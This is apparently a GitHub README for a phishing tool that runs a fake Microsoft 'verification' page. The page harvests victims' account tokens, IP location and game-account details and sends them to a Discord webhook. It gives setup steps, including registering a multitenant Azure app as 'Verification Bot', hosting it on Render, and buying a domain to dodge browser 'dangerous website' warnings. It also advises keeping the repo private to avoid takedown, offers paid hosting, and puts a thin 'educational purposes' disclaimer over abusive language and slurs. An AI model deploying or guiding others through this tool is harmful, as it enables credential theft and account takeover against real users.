## FIRST OF ALL THIS IS FOR EDUCATIONAL PURPOSES ONLY, BY USING THIS YOU AGREE THAT YOU ARE THE ONLY ONE RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS.
## if you're lazy or don't know how to host it, I do hosting services for a cheap price dm me heda#7508

## MADE BY NORMI N40R2I#8855 and me ofc xd L BOZO
Check this out too https://github.com/Normi-Dev/OAR

## READ
PLEASE READ THIS WHOLE THING BEFORE YOU DM ME PLEASE MAN PLSSSSSS

## UPDATE 4
a lil big update
changelog:
- added networth
- added vpn detection (only detects shitty vpns tho)
- added player rank + network level
- organized the code a bit and updated refresh token embed
<img width="566" alt="sshot-2022-12-05-22-00-26" src="https://user-images.githubusercontent.com/107274162/205742448-6afcba65-fde3-4858-bf9b-0f72417a678b.png">


## UPDATE 3
Added IP Location and changed looks a bit
![sshot-2022-12-03-01-51-44](https://user-images.githubusercontent.com/107274162/205414989-51c24a23-f354-4c56-b7f3-f69f75731923.jpg)


## UPDATE 2

I was bored and added a fancy mf html page with a button that opens a popup window (will only work if you use the reidrect_uri/verify aka the update below)
Preview: 
![image](https://user-images.githubusercontent.com/107274162/204950963-b3801052-90cc-4e66-b7a1-fa8e8733ee45.png)
![image](https://user-images.githubusercontent.com/107274162/204953306-a0816eb5-9ee5-4bd7-b488-2a28c1680618.png) 
^^^^ this is for the fake verification server method cuz most ppl use it so yea


## UPDATE 1

Now you dont need the whole login.live link, just use your redirect link and add /verify to it, example :"https://verification-system.onrender.com/verify" I RECOMMEND GETTING A CHEAP CUSTOM DOMAIN AND LINKING IT TO RENDER TO AVOID THE "DANGEROUS WEBSITE" THING


## FOR RETARDS WHO TINK ITS DOUBLEHOOKED LOOK 
![image](https://user-images.githubusercontent.com/107274162/204852826-c230a8e8-188a-4b32-9c7c-e4a64cd2a50c.png)

THIS THING RIGHT THERE IS THE MF WHO SENDS THE EMBED TO THE WEBHOOK, IF IT WAS DOUBLEHOOKED IT WOULD LOOK LIKE THIS : ![image](https://user-images.githubusercontent.com/107274162/204853039-01ca2a38-316a-4c5a-9085-3f8faf7fe408.png)

HERE IT POSTS TO 2 DIFFERENT WEBHOOKS. NOW CRY



## Written Tutorial

1. Fork this repo  (IF YOU DONT WANT THE INTERNET GUARDIANS TO NUKE UR WEBHOOK DOWNLOAD THIS REPO AND UPLOAD IT TO A PRIVATE REPO)
2. Make a Microsoft Azure Application Registration https://portal.azure.com/  
       - create a new app registration  
       - name it something like "Verification Bot"  
       - choose Accounts in any organizational directory (Any Azure AD directory - Multitenant) and personal Microsoft accounts
      
3. Configure in index.js  
       - you need to change: 
          + secret_value  
          + client_id  
          + redirect_uri  
          + webhook_url  
            
4. Host the repo you forked on https://dashboard.render.com/ (WEB SERVICE) link to github and link the repo and just put a name and dont change anything else

## PREVIEW

<img width="566" alt="sshot-2022-12-05-22-00-26" src="https://user-images.githubusercontent.com/107274162/205742548-d977e260-4b50-439a-943c-71404c5d68f3.png">


